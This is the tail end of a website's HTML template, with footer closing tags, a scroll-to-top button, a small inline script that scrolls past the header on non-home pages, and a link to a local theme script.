      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>


  <script type="text/javascript" src="../theme/js/functions.min.js"></script>


</body>
</html>